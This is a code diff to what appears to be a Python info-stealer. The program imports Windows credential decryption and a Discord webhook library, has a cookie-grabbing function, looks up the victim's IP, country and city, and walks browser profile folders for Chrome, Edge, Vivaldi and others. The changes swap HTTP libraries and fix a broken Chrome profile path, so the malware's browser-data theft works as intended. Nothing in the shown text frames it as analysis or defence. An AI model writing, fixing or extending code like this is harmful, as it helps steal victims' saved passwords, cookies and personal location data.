@@ -11,7 +11,6 @@ from win32crypt import CryptUnprotectData
 from Crypto.Cipher import AES
 from discord_webhook import DiscordEmbed, DiscordWebhook
 from subprocess import Popen, PIPE
-from urllib.request import urlopen, Request
 from requests import get
 from re import findall, search
 from win32api import SetFileAttributes, GetSystemMetrics
@@ -78,20 +77,10 @@ def cookies_grabber_mod(u):
 
 def get_Personal_data():
     try:
-        ip_address = urlopen(Request("https://api64.ipify.org")).read().decode().strip()
-        country = (
-            urlopen(Request(f"https://ipapi.co/{ip_address}/country_name"))
-            .read()
-            .decode()
-            .strip()
-        )
-        city = (
-            urlopen(Request(f"https://ipapi.co/{ip_address}/city"))
-            .read()
-            .decode()
-            .strip()
-        )
-    except BaseException:
+        ip_address = get("https://api64.ipify.org").text.strip()
+        country = get(f"https://ipapi.co/{ip_address}/country_name").text.strip()
+        city = get(f"https://ipapi.co/{ip_address}/city").text.strip()
+    except Exception:
         city = "City not found -_-"
         country = "Country not found -_-"
         ip_address = "No IP found -_-"
@@ -254,7 +243,7 @@ def main(dirpath):
                 os.path.join(local, "Sputnik", "Sputnik", "User Data"),
                 os.path.join(local, "Vivaldi", "User Data", "Default"),
                 os.path.join(local, "Google", "Chrome SxS", "User Data"),
-                os.path.join(local, "Google", "Chrome", "User Data" "Default"),
+                os.path.join(local, "Google", "Chrome", "User Data", "Default"),
                 os.path.join(local, "Epic Privacy Browser", "User Data"),
                 os.path.join(local, "Microsoft", "Edge", "User Data", "Default"),
                 os.path.join(local, "uCozMedia", "Uran", "User Data", "Default"),
